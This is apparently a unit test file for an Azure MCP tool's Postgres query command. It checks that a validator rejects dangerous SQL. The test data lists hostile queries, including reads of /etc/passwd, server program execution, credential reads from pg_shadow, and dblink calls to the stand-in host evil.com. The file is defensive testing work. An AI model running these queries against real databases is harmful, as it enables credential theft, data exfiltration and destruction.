// Copyright (c) Microsoft Corporation.
// Licensed under the MIT License.

using System.Diagnostics;
using System.Net;
using System.Text.Json;
using Azure.Mcp.Tools.Postgres.Commands;
using Azure.Mcp.Tools.Postgres.Commands.Database;
using Azure.Mcp.Tools.Postgres.Options;
using Azure.Mcp.Tools.Postgres.Services;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Mcp.Core.Models.Command;
using Microsoft.Mcp.Core.TestUtilities;
using NSubstitute;
using Xunit;

namespace Azure.Mcp.Tools.Postgres.UnitTests.Database;

[DebuggerStepThrough]
public class DatabaseQueryCommandTests
{
    private readonly IServiceProvider _serviceProvider;
    private readonly IPostgresService _postgresService;
    private readonly ILogger<DatabaseQueryCommand> _logger;
    private readonly ITestOutputHelper _output;

    public DatabaseQueryCommandTests(ITestOutputHelper output)
    {
        _logger = Substitute.For<ILogger<DatabaseQueryCommand>>();
        _postgresService = Substitute.For<IPostgresService>();
        _output = output;

        var collection = new ServiceCollection();
        collection.AddSingleton(_postgresService);

        _serviceProvider = collection.BuildServiceProvider();
    }

    [Fact]
    public async Task ExecuteAsync_ReturnsQueryResults_WhenQueryIsValid()
    {
        var expectedResults = new List<string> { "result1", "result2" };

        _postgresService.ExecuteQueryAsync("sub123", "rg1", AuthTypes.MicrosoftEntra, "user1", null, "server1", "db123", "SELECT * FROM test;", Arg.Any<CancellationToken>())
            .Returns(expectedResults);

        var command = new DatabaseQueryCommand(_logger);
        var args = command.GetCommand().Parse(["--subscription", "sub123", "--resource-group", "rg1", $"--{PostgresOptionDefinitions.AuthTypeText}", AuthTypes.MicrosoftEntra, "--user", "user1", "--server", "server1", "--database", "db123", "--query", "SELECT * FROM test;"]);
        var context = new CommandContext(_serviceProvider);
        var response = await command.ExecuteAsync(context, args, TestContext.Current.CancellationToken);

        Assert.NotNull(response);
        Assert.Equal(HttpStatusCode.OK, response.Status);
        Assert.NotNull(response.Results);

        var json = JsonSerializer.Serialize(response.Results);
        var result = JsonSerializer.Deserialize(json, PostgresJsonContext.Default.DatabaseQueryCommandResult);
        Assert.NotNull(result);
        Assert.Equal(expectedResults, result.QueryResult);
    }

    [Fact]
    public async Task ExecuteAsync_ReturnsEmpty_WhenQueryFails()
    {
        _postgresService.ExecuteQueryAsync("sub123", "rg1", AuthTypes.MicrosoftEntra, "user1", null, "server1", "db123", "SELECT * FROM test;", Arg.Any<CancellationToken>())
            .Returns([]);

        var command = new DatabaseQueryCommand(_logger);

        var args = command.GetCommand().Parse(["--subscription", "sub123", "--resource-group", "rg1", $"--{PostgresOptionDefinitions.AuthTypeText}", AuthTypes.MicrosoftEntra, "--user", "user1", "--server", "server1", "--database", "db123", "--query", "SELECT * FROM test;"]);
        var context = new CommandContext(_serviceProvider);
        var response = await command.ExecuteAsync(context, args, TestContext.Current.CancellationToken);

        Assert.NotNull(response);
        Assert.Equal(HttpStatusCode.OK, response.Status);
        Assert.NotNull(response.Results);

        var json = JsonSerializer.Serialize(response.Results);
        var result = JsonSerializer.Deserialize(json, PostgresJsonContext.Default.DatabaseQueryCommandResult);
        Assert.NotNull(result);
        Assert.Empty(result.QueryResult);
    }

    [Theory]
    [InlineData("--subscription")]
    [InlineData("--resource-group")]
    [InlineData("--user")]
    [InlineData("--server")]
    [InlineData("--database")]
    [InlineData("--query")]
    public async Task ExecuteAsync_ReturnsError_WhenParameterIsMissing(string missingParameter)
    {
        var command = new DatabaseQueryCommand(_logger);
        var args = command.GetCommand().Parse(ArgBuilder.BuildArgs(missingParameter,
            ("--subscription", "sub123"),
            ("--resource-group", "rg1"),
            ($"--{PostgresOptionDefinitions.AuthTypeText}", AuthTypes.MicrosoftEntra),
            ("--user", "user1"),
            ("--server", "server123"),
            ("--database", "db123"),
            ("--query", "SELECT * FROM test;")
        ));

        var context = new CommandContext(_serviceProvider);
        var response = await command.ExecuteAsync(context, args, TestContext.Current.CancellationToken);

        Assert.NotNull(response);
        Assert.Equal(HttpStatusCode.BadRequest, response.Status);
        Assert.Equal($"Missing Required options: {missingParameter}", response.Message);
    }

    [Theory]
    [InlineData("DELETE FROM users;")]
    [InlineData("SELECT * FROM users; DROP TABLE users;")]
    [InlineData("SELECT * FROM users -- comment")] // inline comment
    [InlineData("SELECT * FROM users /* block comment */")] // block comment
    [InlineData("SELECT * FROM users; SELECT * FROM other;")] // stacked
    [InlineData("UPDATE accounts SET balance=0;")]
    [InlineData("SELECT pg_read_file('/etc/passwd')")] // file read
    [InlineData("SELECT pg_ls_archive_statusdir()")] // archive status directory listing
    [InlineData("SELECT pg_execute_server_program('id')")] // server program execution
    [InlineData("SELECT lo_export(12345, '/tmp/out')")] // large object export
    [InlineData("SELECT lo_put(12345, 0, 'data')")] // large object write
    [InlineData("SELECT lo_from_bytea(0, 'data')")] // large object from bytea
    [InlineData("SELECT dblink_exec('host=evil.com', 'DROP TABLE x')")] // remote exec
    [InlineData("SELECT dblink_send_query('conn', 'SELECT 1')")] // remote async query
    [InlineData("SELECT pg_copy_to('users', '/tmp/dump')")] // copy-based exfiltration
    [InlineData("SELECT pg_copy_from('users', '/tmp/payload')")] // copy-based injection
    [InlineData("SELECT pg_create_extension('evil_ext')")] // extension install
    [InlineData("SELECT pg_advisory_lock(1)")] // advisory lock abuse
    [InlineData("SELECT pg_advisory_unlock(1)")] // advisory unlock    
    [InlineData("SELECT pg_read_binary_file('/etc/hostname')")] // binary file read
    [InlineData("SELECT pg_ls_dir('/etc')")] // directory listing
    [InlineData("SELECT pg_ls_logdir()")] // log directory listing
    [InlineData("SELECT pg_ls_waldir()")] // WAL directory listing
    [InlineData("SELECT pg_ls_tmpdir()")] // tmp directory listing
    [InlineData("SELECT usename, passwd FROM pg_shadow")] // credential access
    [InlineData("SELECT rolname, rolsuper FROM pg_authid")] // auth access
    [InlineData("SELECT lo_import('/etc/passwd')")] // large object import
    [InlineData("SELECT lo_get(12345)")] // large object read
    [InlineData("SELECT dblink('host=evil.com')")] // external connection
    [InlineData("SELECT dblink_connect('host=evil.com')")] // external connection
    [InlineData("SELECT pg_file_write('/tmp/evil', 'data', false)")] // file write
    [InlineData("SELECT encode(pg_read_binary_file('/etc/hostname'), 'hex')")] // encoded file read
    [InlineData("SELECT pg_stat_file('/etc/passwd')")] // file metadata
    [InlineData("SELECT pg_terminate_backend(1234)")] // session kill DoS
    [InlineData("SELECT pg_cancel_backend(1234)")] // session cancel DoS
    [InlineData("SELECT pg_reload_conf()")] // config reload
    [InlineData("SELECT set_config('log_statement', 'all', false)")] // runtime setting change
    [InlineData("SELECT current_setting('config_file')")] // setting leak
    [InlineData("SELECT pg_sleep(3600)")] // denial-of-service
    [InlineData("SELECT * FROM pg_stat_activity")] // cross-session info leak
    [InlineData("SELECT * FROM pg_user_mappings")] // FDW credential exposure
    public async Task ExecuteAsync_InvalidQuery_ValidationError(string badQuery)
    {
        var command = new DatabaseQueryCommand(_logger);
        var args = command.GetCommand().Parse([
            "--subscription", "sub123",
            "--resource-group", "rg1",
            $"--{PostgresOptionDefinitions.AuthTypeText}", AuthTypes.MicrosoftEntra,
            "--user", "user1",
            "--server", "server1",
            "--database", "db123",
            "--query", badQuery
        ]);

        var context = new CommandContext(_serviceProvider);
        var response = await command.ExecuteAsync(context, args, TestContext.Current.CancellationToken);

        Assert.NotNull(response);
        Assert.Equal(HttpStatusCode.BadRequest, response.Status); // CommandValidationException => 400
        // Service should never be called for invalid queries.
        await _postgresService.DidNotReceive().ExecuteQueryAsync(Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task ExecuteAsync_LongQuery_ValidationError()
    {
        var longSelect = "SELECT " + new string('a', 6000) + " FROM test"; // exceeds max length
        var command = new DatabaseQueryCommand(_logger);
        var args = command.GetCommand().Parse([
            "--subscription", "sub123",
            "--resource-group", "rg1",
            $"--{PostgresOptionDefinitions.AuthTypeText}", AuthTypes.MicrosoftEntra,
            "--user", "user1",
            "--server", "server1",
            "--database", "db123",
            "--query", longSelect
        ]);

        var context = new CommandContext(_serviceProvider);
        var response = await command.ExecuteAsync(context, args, TestContext.Current.CancellationToken);

        Assert.NotNull(response);
        Assert.Equal(HttpStatusCode.BadRequest, response.Status);
        await _postgresService.DidNotReceive().ExecuteQueryAsync(Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<string>(), Arg.Any<CancellationToken>());
    }
}
